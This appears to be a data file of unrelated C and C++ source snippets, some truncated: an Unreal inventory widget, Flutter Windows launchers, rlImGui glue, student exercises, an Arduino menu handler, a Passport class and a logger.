    "\ufeff#include \"UI/Inventory/InventoryWidget.h\"\r\n#include \"Blueprint/WidgetBlueprintLibrary.h\"\r\n#include \"Components/TextBlock.h\"\r\n#include \"Kismet/KismetMathLibrary.h\"\r\n#include \"Components/Image.h\"\r\n#include \"Components/WidgetSwitcher.h\"\r\n#include \"Components/WrapBox.h\"\r\n#include \"UI/Inventory/SlotWidget.h\"\r\n#include \"UI/Inventory/ItemInfoBoardWidget.h\"\r\n#include \"Component/InventoryComponent.h\"\r\n#include \"Chacacter/Demo_GASCharacter.h\"\r\n#include \"Actor/Item.h\"\r\n#include \"UI/Inventory/InventoryDragDropOperation.h\"\r\n\r\nvoid UInventoryWidget::NativePreConstruct()\r\n{\r\n\tSuper::NativePreConstruct();\r\n\t//SetIsFocusable(true);\r\n\t//SetFocus();\r\n}\r\n\r\n// \u5173\u6389\u80cc\u5305\u754c\u9762\r\nFReply UInventoryWidget::NativeOnKeyDown(const FGeometry& InGeometry, const FKeyEvent& InKeyEvent)\r\n{\r\n\tSuper::NativeOnKeyDown(InGeometry, InKeyEvent);\r\n\tif (InKeyEvent.GetKey() == FKey(EKeys::I))\r\n\t{\r\n\t\tRemoveFromParent();\r\n\t\tAPlayerController* Controller = GetOwningPlayer();\r\n\t\tController->bShowMouseCursor = false;\r\n\t\tController->SetInputMode(FInputModeGameOnly());\r\n\t}\r\n\r\n\treturn FReply::Handled();\r\n}\r\n\r\nbool UInventoryWidget::NativeOnDrop(const FGeometry& InGeometry, const FDragDropEvent& InDragDropEvent, UDragDropOperation* InOperation)\r\n{\r\n\t//bReadyToDragOneItem = false;\r\n\tif (!SlotWidget) return false;\r\n\tif (UInventoryDragDropOperation* Dragging = Cast<UInventoryDragDropOperation>(InOperation))\r\n\t{\r\n\t\t// \u5728\u63d2\u69fd\u5916\u91ca\u653e\u62d6\u62fd\u7684\u7269\u54c1\uff0c\u7269\u54c1\u56de\u5230\u539f\u4f4d\r\n\t\tswitch (Dragging->Item.EItemType)\r\n\t\t{\r\n\t\tcase EItemsType::EIT_Food:\r\n\t\t\tInventoryComp->GetInventoryItem_Ref().Food[Dragging->Index] = Dragging->Item;\r\n\t\t\tInventoryComp->UpdateInventoryWidget();\r\n\t\t\tbreak;\r\n\t\tcase EItemsType::EIT_Weapon:\r\n\t\t\tInventoryComp->GetInventoryItem_Ref().Weapon[Dragging->Index] = Dragging->Item;\r\n\t\t\tInventoryComp->UpdateInventoryWidget();\r\n\t\t\tbreak;\r\n\t\tcase EItemsType::EIT_Shield:\r\n\t\t\tInventoryComp->GetInventoryItem_Ref().Shield[Dragging->Index] = Dragging->Item;\r\n\t\t\tInventoryComp->UpdateInventoryWidget();\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\treturn false;\r\n}\r\n\r\nvoid UInventoryWidget::UpdateMoney(int32 Moneys)\r\n{\r\n\tint32 Value = UKismetMathLibrary::Clamp(Moneys, 0, 999999999);\r\n\tMoneyAmount->SetText(FText::AsNumber(Value));\r\n}\r\n\r\nvoid UInventoryWidget::SelectWidget(int32 Selection, const FLinearColor& Normal, const FLinearColor& NotSelected)\r\n{\r\n\tswitch (Selection)\r\n\t{\r\n\tcase 0:\r\n\t\tWidgetSwitcher->SetActiveWidgetIndex(Selection);\r\n\t\tArmorImage->SetColorAndOpacity(NotSelected);\r\n\t\tFoodImage->SetColorAndOpacity(NotSelected);\r\n\t\tSwordImage->SetColorAndOpacity(Normal);\r\n\t\tbreak;\r\n\tcase 1:\r\n\t\tWidgetSwitcher->SetActiveWidgetIndex(Selection);\r\n\t\tSwordImage->SetColorAndOpacity(NotSelected);\r\n\t\tFoodImage->SetColorAndOpacity(NotSelected);\r\n\t\tArmorImage->SetColorAndOpacity(Normal);\r\n\t\tbreak;\r\n\tcase 2:\r\n\t\tWidgetSwitcher->SetActiveWidgetIndex(Selection);\r\n\t\tSwordImage->\tSetColorAndOpacity(NotSelected);\r\n\t\tArmorImage->\tSetColorAndOpacity(NotSelected);\r\n\t\tFoodImage->\tSetColorAndOpacity(Normal);\r\n\t\tbreak;\r\n\tdefault:\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\nvoid UInventoryWidget::SwitchControlColor(int32 Selection, UImage* ImageWidget, const FLinearColor& Selected, const FLinearColor& NotSelected)\r\n{\r\n\tif (WidgetSwitcher->GetActiveWidgetIndex() == Selection)\r\n\t{\r\n\t\tImageWidget->SetColorAndOpacity(Selected);\r\n\t}\r\n\telse\r\n\t{\r\n\t\tImageWidget->SetColorAndOpacity(NotSelected);\r\n\t}\r\n}\r\n\r\nvoid UInventoryWidget::UpdateItemWidgets(FInventoryItem& InventoryItem)\r\n{\r\n\tWeaponWidgets->ClearChildren();\r\n\tArmorWidgets->ClearChildren();\r\n\tFoodWidgets->ClearChildren();\r\n\r\n\tif (!SlotWidgetClass) return;\r\n\tAddItem(InventoryItem.Weapon, WeaponWidgets);\r\n\tAddItem(InventoryItem.Shield, ArmorWidgets);\r\n\tAddItem(InventoryItem.Food, FoodWidgets);\r\n}\r\n\r\nvoid UInventoryWidget::AddItem(TArray<FItemSlot>& ItemSlot, UWrapBox* WrapBox)\r\n{\r\n\tint32 Index = -1;\r\n\tfor (FItemSlot& Item_Index : ItemSlot)\r\n\t{\r\n\t\tIndex++;\r\n\r\n\t\t// \u521b\u5efa\u63d2\u69fd\r\n\t\tSlotWidget = CreateWidget<USlotWidget>(this, SlotWidgetClass);\r\n\r\n\t\t// \u8bbe\u7f6e\u63d2\u69fd\u53c2\u6570\r\n\t\tItem_Index.Index = Index;\r\n\t\tSlotWidget->SetItem(Item_Index);\r\n\t\tSlotWidget->SetIndex(Index);\r\n\r\n\t\tItemInSlotHasBeEquippedOrNot(Item_Index, Index);\r\n\r\n\t\t// \u6dfb\u52a0\u63d2\u69fd\r\n\t\tWrapBox->AddChild(SlotWidget);\r\n\t}\r\n}\r\n\r\nvoid UInventoryWidget::ItemInSlotHasBeEquippedOrNot(FItemSlot& Item_Index, const int32& Index)\r\n{\r\n\tbool bSameItem = false;\r\n\r\n\tif (Item_Index.ItemID.RowName != FName(\"None\"))\r\n\t{\r\n\t\t// \u89d2\u8272\u88c5\u5907\u7740\u6b66\u5668\u6216\u76fe\u724c\r\n\t\tif (InventoryComp->GetPlayerCharacter()->GetWeaponMesh())\r\n\t\t{\r\n\t\t\t// \u63d2\u69fd\u91cc\u7684\u662f\u6b66\u5668\u8fd8\u662f\u76fe\u724c\uff1f\r\n\t\t\tif (Item_Index.EItemType == EItemsType::EIT_Weapon)\r\n\t\t\t{\r\n\t\t\t\tbSameItem = InventoryComp->EquippedWeapon.ItemID.RowName == Item_Index.ItemID.RowName;\r\n\t\t\t\tif (bSameItem && Index == InventoryComp->EquippedWeapon.Index)\r\n\t\t\t\t{\r\n\t\t\t\t\tSlotWidget->SetEquipped(true);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tSlotWidget->SetEquipped(false);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tif (InventoryComp->GetPlayerCharacter()->GetShieldMesh())\r\n\t\t{\r\n\t\t\tif (Item_Index.EItemType == EItemsType::EIT_Shield)\r\n\t\t\t{\r\n\t\t\t\tbSameItem = InventoryComp->EquippedShield.ItemID.RowName == Item_Index.ItemID.RowName;\r\n\t\t\t\tif (bSameItem && Inde",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct Node{\n    int data;\n    Node *next;\n    Node(int x) : data(x), next(nullptr) {}\n};\n\nstruct Queue{ //queue using linked list\nprivate:\n    Node *front = NULL, *rear = NULL;\n    \npublic:\n    void enqueue(int val){\n        Node *newNode = new Node(val);\n        if(isEmpty()){\n            front = rear = newNode;\n        }\n        else{\n            rear->next = newNode;\n            rear = newNode;\n        }\n    };\n    void dequeue(){\n        if(isEmpty()){\n            cout << \"queue is empty\" << endl;\n        }\n        else if(front == rear){\n            delete front;\n            front = rear = NULL;\n        }\n        else{\n            \n            Node *temp = front;\n            front = front->next;\n            delete temp;\n        }\n    };\n    void display_queue(){\n        Node *curr = front;\n        while(curr != NULL){\n            cout << curr->data << \" \";\n            curr = curr->next;\n        }\n        cout << endl;\n    };\n    int get_front(){\n        if(isEmpty()){\n            cout << \"queue is empty\" << endl;\n            return -1;\n        }\n        else{\n            return front->data;\n        }\n    }\n    bool isEmpty(){\n        return (front == NULL);\n    }\n};\n\nint main()\n{\n    Queue q;\n    q.enqueue(1);\n    q.enqueue(2);\n    q.enqueue(3);\n    q.enqueue(4);\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.dequeue();\n    q.dequeue();\n\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.enqueue(3);\n    q.enqueue(4);\n\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n    cout << \"queue : \";\n    q.display_queue();\n\n    q.dequeue();\n    cout << \"Front : \" << q.get_front() << endl;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"simple_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"corusel_slider\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**********************************************************************************************\n*\n*   raylibExtras * Utilities and Shared Components for Raylib\n*\n*   rlImGui * basic ImGui integration\n*\n*   LICENSE: ZLIB\n*\n*   Copyright (c) 2024 Jeffery Myers\n*\n*   Permission is hereby granted, free of charge, to any person obtaining a copy\n*   of this software and associated documentation files (the \"Software\"), to deal\n*   in the Software without restriction, including without limitation the rights\n*   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n*   copies of the Software, and to permit persons to whom the Software is\n*   furnished to do so, subject to the following conditions:\n*\n*   The above copyright notice and this permission notice shall be included in all\n*   copies or substantial portions of the Software.\n*\n*   THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n*   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n*   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n*   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n*   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n*   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n*   SOFTWARE.\n*\n**********************************************************************************************/\n#include \"rlImGui.h\"\n\n#include \"imgui_impl_raylib.h\"\n\n#include \"raylib.h\"\n#include \"rlgl.h\"\n\n#include <math.h>\n#include <map>\n#include <limits>\n\n#ifndef NO_FONT_AWESOME\n#include \"extras/FA6FreeSolidFontData.h\"\n#endif\n\nstatic ImGuiMouseCursor CurrentMouseCursor = ImGuiMouseCursor_COUNT;\nstatic MouseCursor MouseCursorMap[ImGuiMouseCursor_COUNT];\n\nImGuiContext* GlobalContext = nullptr;\n\nstatic std::map<KeyboardKey, ImGuiKey> RaylibKeyMap;\n\nstatic bool LastFrameFocused = false;\n\nstatic bool LastControlPressed = false;\nstatic bool LastShiftPressed = false;\nstatic bool LastAltPressed = false;\nstatic bool LastSuperPressed = false;\n\nbool rlImGuiIsControlDown() { return IsKeyDown(KEY_RIGHT_CONTROL) || IsKeyDown(KEY_LEFT_CONTROL); }\nbool rlImGuiIsShiftDown() { return IsKeyDown(KEY_RIGHT_SHIFT) || IsKeyDown(KEY_LEFT_SHIFT); }\nbool rlImGuiIsAltDown() { return IsKeyDown(KEY_RIGHT_ALT) || IsKeyDown(KEY_LEFT_ALT); }\nbool rlImGuiIsSuperDown() { return IsKeyDown(KEY_RIGHT_SUPER) || IsKeyDown(KEY_LEFT_SUPER); }\n\nvoid ReloadFonts(void)\n{\n    ImGuiIO& io = ImGui::GetIO();\n    unsigned char* pixels = nullptr;\n\n    int width;\n    int height;\n    io.Fonts->GetTexDataAsRGBA32(&pixels, &width, &height, nullptr);\n    Image image = GenImageColor(width, height, BLANK);\n    memcpy(image.data, pixels, width * height * 4);\n\n    Texture2D* fontTexture = (Texture2D*)io.Fonts->TexID;\n    if (fontTexture && fontTexture->id != 0)\n    {\n        UnloadTexture(*fontTexture);\n        MemFree(fontTexture);\n    }\n\n    fontTexture = (Texture2D*)MemAlloc(sizeof(Texture2D));\n    *fontTexture = LoadTextureFromImage(image);\n    UnloadImage(image);\n    io.Fonts->TexID = fontTexture;\n}\n\nstatic const char* GetClipTextCallback(void*) \n{\n    return GetClipboardText();\n}\n\nstatic void SetClipTextCallback(void*, const char* text)\n{\n    SetClipboardText(text);\n}\n\nstatic void ImGuiNewFrame(float deltaTime)\n{\n    ImGuiIO& io = ImGui::GetIO();\n\n\n    Vector2 resolutionScale = GetWindowScaleDPI();\n\n#ifndef PLATFORM_DRM\n    if (IsWindowFullscreen())\n    {\n        int monitor = GetCurrentMonitor();\n        io.DisplaySize.x = float(GetMonitorWidth(monitor));\n        io.DisplaySize.y = float(GetMonitorHeight(monitor));\n    }\n    else\n    {\n        io.DisplaySize.x = float(GetScreenWidth());\n        io.DisplaySize.y = float(GetScreenHeight());\n    }\n\n#if !defined(__APPLE__)\n    if (!IsWindowState(FLAG_WINDOW_HIGHDPI))\n        resolutionScale = Vector2{ 1,1 };\n#endif\n#else\n    io.DisplaySize.x = float(GetScreenWidth());\n    io.DisplaySize.y = float(GetScreenHeight());\n#endif\n\n    io.DisplayFramebufferScale = ImVec2(resolutionScale.x, resolutionScale.y);\n\n    io.DeltaTime = deltaTime;\n\n    if (io.WantSetMousePos)\n    {\n        SetMousePosition((int)io.MousePos.x, (int)io.MousePos.y);\n    }\n    else\n    {\n        io.AddMousePosEvent((float)GetMouseX(), (float)GetMouseY());\n    }\n\n    auto setMouseEvent = [&io](int rayMouse, int imGuiMouse)\n        {\n            if (IsMouseButtonPressed(rayMouse))\n                io.AddMouseButtonEvent(imGuiMouse, true);\n            else if (IsMouseButtonReleased(rayMouse))\n                io.AddMouseButtonEvent(imGuiMouse, false);\n        };\n\n    setMouseEvent(MOUSE_BUTTON_LEFT, ImGuiMouseButton_Left);\n    setMouseEvent(MOUSE_BUTTON_RIGHT, ImGuiMouseButton_Right);\n    setMouseEvent(MOUSE_BUTTON_MIDDLE, ImGuiMouseButton_Middle);\n    setMouseEvent(MOUSE_BUTTON_FORWARD, ImGuiMouseButton_Middle+1);\n    setMouseEvent(MOUSE_BUTTON_BACK, ImGuiMouseButton_Middle+2);\n\n    {\n        Vector2 mouseWheel = GetMouseWheelMoveV();\n        io",
    "\ufeff// soru2.cpp : Bu dosya 'main' i\u015flevi i\u00e7eriyor. Program y\u00fcr\u00fctme orada ba\u015flay\u0131p biter.\r\n//\r\n\r\n#include <iostream>\r\n\r\n\r\n// Program\u0131 \u00e7al\u0131\u015ft\u0131r: Ctrl + F5 veya Hata Ay\u0131kla > Hata Ay\u0131klamadan Ba\u015flat men\u00fcs\u00fc\r\n// Programda hata ay\u0131kla: F5 veya Hata Ay\u0131kla > Hata Ay\u0131klamay\u0131 Ba\u015flat men\u00fcs\u00fc\r\n\r\n// Kullanmaya Ba\u015flama \u0130pu\u00e7lar\u0131: \r\n//   1. Dosyalar\u0131 eklemek/y\u00f6netmek i\u00e7in \u00c7\u00f6z\u00fcm Gezgini penceresini kullan\u0131n\r\n//   2. Kaynak denetimine ba\u011flanmak i\u00e7in Tak\u0131m Gezgini penceresini kullan\u0131n\r\n//   3. Derleme \u00e7\u0131kt\u0131s\u0131n\u0131 ve di\u011fer iletileri g\u00f6rmek i\u00e7in \u00c7\u0131kt\u0131 penceresini kullan\u0131n\r\n//   4. Hatalar\u0131 g\u00f6r\u00fcnt\u00fclemek i\u00e7in Hata Listesi penceresini kullan\u0131n\r\n//   5. Yeni kod dosyalar\u0131 olu\u015fturmak i\u00e7in Projeye Git > Yeni \u00d6\u011fe ekle veya varolan kod dosyalar\u0131n\u0131 projeye eklemek i\u00e7in Proje > Var Olan \u00d6\u011feyi Ekle ad\u0131mlar\u0131n\u0131 izleyin\r\n//   6. Bu projeyi daha sonra yeniden a\u00e7mak i\u00e7in Dosya > A\u00e7 > Proje'ye gidip .sln uzant\u0131l\u0131 dosyay\u0131 se\u00e7in\r\n\r\n\r\n\r\n\r\n\r\n\r\n/*\u00d6yle bir s\u0131ralama algoritmas\u0131 tasarlay\u0131n\u0131z ki, s\u0131ralama i\u015flemini bir\r\nen b\u00fcy\u00fck bir en k\u00fc\u00e7\u00fck eleman olacak \u015fekilde yaps\u0131n. \u00d6rne\u011fin\r\n(60,80,3,9,57,11) gibi bir diziyi (80,3,60,9,57,11) \u015feklinde\r\ns\u0131ralayacak. Program par\u00e7as\u0131 C programlama dili ile yaz\u0131lacakt\u0131r. */\r\n#define _CRT_SECURE_NO_WARNINGS\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\nvoid quickSort(int arr[], int low, int high) {\r\n    if (low < high) {\r\n        int pivot = arr[(low + high) / 2]; // Orta eleman\u0131 pivot olarak se\u00e7elim\r\n        int i = low - 1, j = high + 1, temp;\r\n        while (1) {\r\n            do {\r\n                i++;\r\n            } while (arr[i] < pivot);\r\n\r\n            do {\r\n                j--;\r\n            } while (arr[j] > pivot);\r\n\r\n            if (i >= j)\r\n                break;\r\n\r\n            // Swap arr[i] and arr[j]\r\n            temp = arr[i];\r\n            arr[i] = arr[j];\r\n            arr[j] = temp;\r\n        }\r\n        quickSort(arr, low, j);\r\n        quickSort(arr, j + 1, high);\r\n    }\r\n}\r\n\r\nvoid birbuyukbirkucuk(int arr[], int n) {\r\n    quickSort(arr, 0, n - 1);\r\n    int* result = (int*)malloc(n * sizeof(int));\r\n    if (result == NULL) {\r\n        printf(\"Bellek ay\u0131rma hatas\u0131!\\n\");\r\n        return;\r\n    }\r\n\r\n    int left = 0, right = n - 1, index = 0;\r\n\r\n    while (left <= right) {\r\n        result[index++] = arr[right--];\r\n        if (left <= right)\r\n            result[index++] = arr[left++];\r\n    }\r\n\r\n    for (int i = 0; i < n; i++)\r\n        arr[i] = result[i];\r\n\r\n    free(result);\r\n}\r\n\r\nvoid diziYazdir(int arr[], int n) {\r\n    for (int i = 0; i < n; i++)\r\n        printf(\"%d \", arr[i]);\r\n    printf(\"\\n\");\r\n}\r\n\r\nint main() {\r\n    int dizi[5];\r\n\r\n    printf(\"L\u00fctfen 5 tamsay\u0131 giriniz: \");\r\n    for (int i = 0; i < 5; i++) {\r\n        scanf_s(\"%d\", &dizi[i]);\r\n    }\r\n\r\n    birbuyukbirkucuk(dizi, 5);\r\n\r\n    printf(\"\u00d6zel s\u0131ralanm\u0131\u015f dizi: \");\r\n    diziYazdir(dizi, 5);\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\nusing namespace std;\nint debug = 0;\n\nclass characters {\n  public:\n  unsigned int hp;\n  string name;\n  unsigned atk;\n\n    characters(int hp, int atk, string name = \"Enemy\") : hp(hp), atk(atk), name(name) {\n      if (debug) {\n        string details = \"name: \" + name + \" hp: \" + to_string(hp) + \" atk: \" + to_string(atk);\n        cout << details << endl;\n      }\n    }\n\n    void display_battle(characters& player, characters& enemy) {\n      cout << \"name: \" << player.name << \" hp: \" << player.hp << \" atk: \" << player.atk << endl;\n      cout << \"\\n\" << endl;\n      cout << \"\u00ab\" << player.name << \"\u00bb\\t\" << \"\u00ab\" << enemy.name << \"\u00bb\" << endl;\n      cout << \"\\n\" << endl;\n      cout << \"name: \" << enemy.name << \" hp: \" << enemy.hp << \" atk: \" << enemy.atk << endl;\n    }\n\n    int menu(){\n      cout << \":::[1]Attack   [2]Bag   [3]Try to run   [4]Show battle   [5]Exit\" << endl;\n      unsigned int choice;\n      cin >> choice;\n      return choice;\n    }\n};\n\nint main() {\n  characters player(200, 60, \"pranav\");\n  characters enemy(150, 40);\n  unsigned int choice;\n  player.display_battle(player,enemy);\n  while(1){\n    choice = player.menu();\n    if(choice==1){\n      enemy.hp -= player.atk;\n      cout << \"Enemy's hp: \" << enemy.hp << endl;\n      if(enemy.hp>=0){\n        cout << \"Enemy gone\" << endl;\n      }\n    } else if(choice==2){\n      cout << \"Work in progress!\" << endl;\n    } else if(choice==3){\n      cout << \"Learn randint in cpp\" << endl;\n    } else if(choice==4){\n      player.display_battle(player,enemy);\n    } else if(choice==5){\n      cout << \"trying to exit.\" << endl;\n      return 0;\n    }\n  }\n}\n\n",
    "#include \"button.h\"\n\n\nButton::Button(LiquidCrystal_I2C &lcd_addr, Stepper &motor_adr)\n    : lcd(lcd_addr), motor(motor_adr)\n{\n    \n}\n\nButton::~Button()\n{\n\n}\n\nvoid Button::handleMenuSelect(bool &menuActive, uint64_t &lastButtonPressTime, const uint8_t NUM_MENU_OPTIONS) \n{\n  menuActive = true;\n  lastButtonPressTime = millis();\n\n  // Increment menu option\n  menu = static_cast<MenuOption>((menu + 1) % NUM_MENU_OPTIONS);\n  \n  lcd.clear();\n  lcd.setCursor(0, 0);\n  switch (menu) {\n    case TEMPERATURE:\n      lcd.print(\"PozTeplota\");\n      break;\n    case HUMIDITY:\n      lcd.print(\"PozVlhkost\");\n      break;\n    case MOTOR_ROTATE:\n      lcd.print(\"Otocenie motora\");\n      break;\n    case TIME_RESET:\n      lcd.print(\"Reset casovaca\");\n      break;\n  }\n}\n\nvoid Button::handleValueIncrease(float &requestedTempValue, float &requestedHumidityValue, uint64_t &lastButtonPressTime) \n{\n  lastButtonPressTime = millis();\n\n  if (menu == TEMPERATURE) requestedTempValue += 0.1f;\n\n  if (menu == HUMIDITY) requestedHumidityValue += 0.1f;\n\n  if (menu == MOTOR_ROTATE) motor.step(5);\n\n  updateLCD(requestedTempValue, requestedHumidityValue);\n}\n\nvoid Button::handleValueDecrease(float &requestedTempValue, float &requestedHumidityValue, uint64_t &lastButtonPressTime) \n{\n  lastButtonPressTime = millis();\n\n  if (menu == TEMPERATURE) requestedTempValue -= 0.1f;\n\n  if (menu == HUMIDITY) requestedHumidityValue -= 0.1f;\n\n  if (menu == MOTOR_ROTATE) motor.step(-5);\n\n  updateLCD(requestedTempValue, requestedHumidityValue);\n}\n\nvoid Button::exitMenu(const uint8_t START_EEPROM_ADDRESS, float &requestedTempValue, float &requestedHumidityValue, bool &menuActive, uint64_t &daysElapsed) \n{\n  menuActive = false;\n\n  // Write data to EEPROM\n  if (menu == TEMPERATURE) EEPROM.put(START_EEPROM_ADDRESS, requestedTempValue);\n\n  if (menu == HUMIDITY) EEPROM.put(sizeof(requestedTempValue), requestedHumidityValue);\n\n  if (menu == TIME_RESET) {\n    EEPROM.put(sizeof(requestedTempValue) + sizeof(requestedHumidityValue), daysElapsed = (uint64_t) 0);\n  } \n\n  lcd.clear();\n  lcd.setCursor(0, 0);\n  lcd.print(\"Ulozene do\");\n  lcd.setCursor(0, 1);\n  lcd.print(\"EEPROM pamate\");\n  delay(1000);\n  lcd.clear();\n}\n\nvoid Button::updateLCD(float &requestedTempValue, float &requestedHumidityValue) \n{\n  lcd.clear();\n  switch (menu) {\n    case TEMPERATURE:\n      lcd.setCursor(0, 0);\n      lcd.print(\"Teplota: \");\n      lcd.print(requestedTempValue);\n      break;\n    case HUMIDITY:\n      lcd.setCursor(0, 0);\n      lcd.print(\"Vlhkost: \");\n      lcd.print(requestedHumidityValue);\n      break;\n    case MOTOR_ROTATE:\n      lcd.setCursor(0, 0);\n      lcd.print(\"Otacanie motora \");\n      break;\n  }\n}\n",
    "#include \"Passport.h\"\n\nPassport::Passport()\n{\n    series = \"Empty\";\n    number = \"Empty\";\n    lastName = \"Empty\";\n    firstName = \"Empty\";\n    middleName = \"Empty\";\n    birthday = Date();\n    birthplace = \"Empty\";\n    issueDate = birthday + 14L;\n    issuesBy = \"Empty\";\n    registration = \"Empty\";\n}\n\nPassport::Passport(string series, string number, string lastName, string firstName, string middleName, Date birthday, string birthplace, Date issueDate, string issuesBy, string registration)\n{\n    this->series = series;\n    this->number = number;\n    this->lastName = lastName;\n    this->firstName = firstName;\n    this->middleName = middleName;\n    this->birthday = birthday;\n    this->birthplace = birthplace;\n    if (issueDate > birthday)this->issueDate = issueDate;\n    else this->issueDate = Date();\n    this->issuesBy = issuesBy;\n    this->registration = registration;\n}\n\nvoid Passport::setLastName(string lastName)\n{\n    this->lastName = lastName;\n}\n\nstring Passport::getSeries() const\n{\n    return series;\n}\n\nstring Passport::getNumber() const\n{\n    return number;\n}\n\nstring Passport::getLastName() const\n{\n    return lastName;\n}\n\nstring Passport::getFirstName() const\n{\n    return firstName;\n}\n\nstring Passport::getMiddleName() const\n{\n    return middleName;\n}\n\nDate Passport::getBirthDate() const\n{\n    return birthday;\n}\n\nstring Passport::getBirthPlace() const\n{\n    return birthplace;\n}\n\nDate Passport::getIssueDate() const\n{\n    return issueDate;\n}\n\nstring Passport::getIssuedBy() const\n{\n    return issuesBy;\n}\n\nstring Passport::getRegistration() const\n{\n    return registration;\n}\n\nvoid Passport::showInfo() const\n{\n    cout << \"Passport Information:\" << endl;\n    cout << \"Series: \" << series << endl;\n    cout << \"Number: \" << number << endl;\n    cout << \"Last Name: \" << lastName << endl;\n    cout << \"First Name: \" << firstName << endl;\n    cout << \"Middle Name: \" << middleName << endl;\n    cout << \"Birth Date: \" << birthday << endl;\n    cout << \"Birth Place: \" << birthplace << endl;\n    cout << \"Issue Date: \" << issueDate << endl;\n    cout << \"Issued By: \" << issuesBy << endl;\n    cout << \"Registration: \" << registration << endl;\n}\n",
    "/*\n * Copyright (C) 2024 IIT-HHCM\n * Author: Liana Bertoni\n * email:  liana.bertoni@iit.it\n * \n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n * http://www.apache.org/licenses/LICENSE-2.0\n * \n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n*/\n\n#include <DynamicCollisionAvoidance/utils/logger.h>\n\nLoggerL::LoggerL()\n{\n\n}\n\nvoid LoggerL::initLogger(std::string logFilesPath)\n{\n\t// Create matlogger\n\t_logger = XBot::MatLogger2::MakeLogger(logFilesPath); // date-time automatically appended\n}\n\nvoid LoggerL::setLogger(bool setMode)\n{\n\tif(setMode) // fixed size 10000\n\t\t_logger->set_buffer_mode(XBot::VariableBuffer::Mode::circular_buffer);\n\telse\n\t{\n\t\t_appender = XBot::MatAppender::MakeInstance();\n\t\t_appender->add_logger(_logger);\n\t\t_appender->start_flush_thread();\n\t}\n}\n\nbool LoggerL::logData(std::string dataName, Eigen::VectorXd data)\n{\n\t// log data\n\t_logger->add(dataName,data);\n\treturn true;\n}\n\nbool LoggerL::logData(std::string dataName, double data)\n{\n\t// log data\n\t_logger->add(dataName,data);\n\treturn 